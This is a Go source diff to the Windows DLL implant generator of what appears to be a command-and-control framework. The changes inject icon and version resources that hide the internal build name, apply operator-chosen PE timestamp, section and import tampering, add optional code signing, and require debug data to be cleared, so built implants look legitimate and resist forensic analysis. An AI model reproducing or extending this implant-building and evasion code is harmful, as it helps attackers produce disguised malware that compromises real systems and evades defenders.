@@ -124,11 +124,6 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 
 	ldflags, blob, sKey := buildLdflags(cfg, profile, "windows")
 
-	// Windows icon handling (DLL also supports .rsrc)
-	if err := injectIconResource(tmpDir, cfg); err != nil {
-		fmt.Printf("icon injection warning: %v\n", err)
-	}
-
 	outName := cfg.Filename
 	if outName == "" {
 		outName = uniqueBuildName("forgec2_agent", ".dll")
@@ -137,6 +132,24 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 		outName += ".dll"
 	}
 	outName = safeBuildFileName(outName)
+
+	// Windows icon handling (DLL also supports .rsrc). A requested resource
+	// that cannot be embedded fails the build instead of silently shipping the
+	// default icon.
+	resourceName := cfg.OriginalFilename
+	if resourceName == "" {
+		if cfg.Filename == "" {
+			// Direct generator callers that let the server pick an output name
+			// must not leak the internal build name into VersionInfo.
+			resourceName = "agent.dll"
+		} else {
+			resourceName = outName
+		}
+	}
+	if err := injectIconResource(tmpDir, cfg, resourceName); err != nil {
+		return "", fmt.Errorf("resource injection failed: %w", err)
+	}
+
 	outPath, buildPath, err := prepareBuildOutput(outputDir, outName)
 	if err != nil {
 		return "", err
@@ -155,21 +168,30 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 		return "", err
 	}
 
-	// Strip PE forensic artifacts in every mode (garble does not clean them)
-	// and remove the Go-generated .h export header next to the DLL.
-	if err := stripPEArtifacts(buildPath); err != nil {
-		return "", fmt.Errorf("strip PE artifacts: %w", err)
+	// Run the same PE finalization pipeline as the EXE path so the DLL honors
+	// pe_timestamp / pe_sections / pe_imports instead of silently ignoring the
+	// operator's selections.
+	if err := finalizePE(buildPath, cfg, goarch); err != nil {
+		return "", err
 	}
 
-	if cfg.SelfCheck {
-		if err := patchSelfCheckHash(buildPath); err != nil {
-			return "", err
-		}
+	// self_check is rejected for DLLs in ValidateImplantBuild: os.Executable()
+	// resolves to the host process, so the check would hash rundll32.exe (or
+	// whatever loaded the DLL) and os.Exit(1) would kill the host.
+
+	// Authenticode signing runs on the finalized bytes and before validation.
+	if err := signPEIfRequested(buildPath, cfg); err != nil {
+		return "", err
 	}
 
 	// Fail loudly (rather than deliver a corrupt binary) if the produced DLL is
-	// malformed or the wrong architecture.
-	if err := validatePE(buildPath, windowsMachine(goarch)); err != nil {
+	// malformed, is not actually a DLL, or is the wrong architecture.
+	if err := validatePEWith(buildPath, peExpect{
+		Machine:             windowsMachine(goarch),
+		DLL:                 true,
+		Signed:              cfg.CodeSigningEnabled(),
+		RequireDebugCleared: true,
+	}); err != nil {
 		return "", fmt.Errorf("generated dll failed PE validation: %w", err)
 	}
 
